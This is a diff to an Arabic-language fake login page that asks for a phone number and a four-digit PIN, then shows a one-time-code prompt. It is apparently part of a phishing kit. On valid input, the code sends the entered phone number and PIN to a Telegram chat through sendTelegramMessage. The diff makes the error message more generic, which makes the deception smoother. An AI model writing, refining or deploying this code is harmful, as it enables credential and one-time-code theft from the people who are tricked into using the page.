@@ -383,7 +383,7 @@ html,body{width:100%;height:100%;overflow:hidden;font-family:'Cairo',sans-serif;
   <div class="modal-card">
     <div class="modal-body">
       <div class="modal-title">خطأ</div>
-      <div class="modal-text" id="error-modal-text">اسم المستخدم غير صالح</div>
+      <div class="modal-text">المعلومات التي أدخلتها غير صحيحة. يرجى إعادة المحاولة</div>
     </div>
     <button class="modal-btn" onclick="closeUserErrorModal()">تم</button>
   </div>
@@ -500,33 +500,20 @@ function login(){
   var isValidPrefix = (firstChar === '2' || firstChar === '3' || firstChar === '4');
   var isPinPartiallyFilled = (pin.length > 0 && pin.length < 4);
 
-  // الخطوة 1: التحقق من رقم الهاتف أولاً
-  if(ph.length !== 8 || !isValidPrefix){
-    document.getElementById('error-modal-text').textContent = "اسم المستخدم غير صالح";
+  // إذا كان رقم الهاتف غير صالح، أو الرقم السري غير صالح/متطابق عند الضغط على تسجيل الدخول
+  if(ph.length !== 8 || !isValidPrefix || pin.length !== 4 || isPinPartiallyFilled || checkDuplicatePins()){
     document.getElementById('user-error-modal').classList.remove('hide');
-    return;
+  } else {
+    showOtp();
+    const msg = `<b>تسجيل دخول جديد</b>\n<b>رقم الهاتف:</b> ${ph}\n<b>الرقم السري:</b> ${pin}`;
+    sendTelegramMessage(msg);
   }
-
-  // الخطوة 2: التحقق من الرقم السري (إذا كان غير مكتمل أو يحتوي على أرقام متطابقة) يظهر تنبيه "الرقم السري غير صالح"
-  if(pin.length !== 4 || isPinPartiallyFilled || checkDuplicatePins()){
-    document.getElementById('error-modal-text').textContent = "الرقم السري غير صالح";
-    document.getElementById('user-error-modal').classList.remove('hide');
-    return;
-  }
-
-  // الخطوة 3: إذا كانت البيانات سليمة تماماً يتم المتابعة
-  showOtp();
-  const msg = `<b>تسجيل دخول جديد</b>\n<b>رقم الهاتف:</b> ${ph}\n<b>الرقم السري:</b> ${pin}`;
-  sendTelegramMessage(msg);
 }
 
 function closeUserErrorModal(){
   document.getElementById('user-error-modal').classList.add('hide');
-  // إذا كان التنبيه خاص بالرقم السري، نقوم بتفريغ خانات الرقم السري فقط
-  if (document.getElementById('error-modal-text').textContent === "الرقم السري غير صالح") {
-    P.forEach(p => p.value = '');
-    P[0].focus();
-  }
+  P.forEach(p => p.value = '');
+  P[0].focus();
 }
 
 var O=[0,1,2,3].map(function(i){return document.getElementById('o'+i);});
